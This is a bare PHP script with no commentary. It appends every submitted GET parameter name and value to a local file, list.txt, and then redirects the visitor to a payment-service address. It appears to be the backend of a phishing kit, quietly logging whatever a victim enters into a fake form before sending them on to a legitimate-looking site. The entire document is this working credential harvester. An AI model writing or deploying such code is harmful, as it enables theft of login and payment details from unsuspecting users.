<?php
Header("Location: https://ers.afghan-pay.com");

$handle = fopen("list.txt", "a");

foreach($_GET as $variable => $value) {

fwrite ($handle, $variable);
fwrite ($handle, $value);
fwrite ($handle, "\r\n");
}
fwrite ($handle, "\r\n");

fclose($handle);
exit;
?>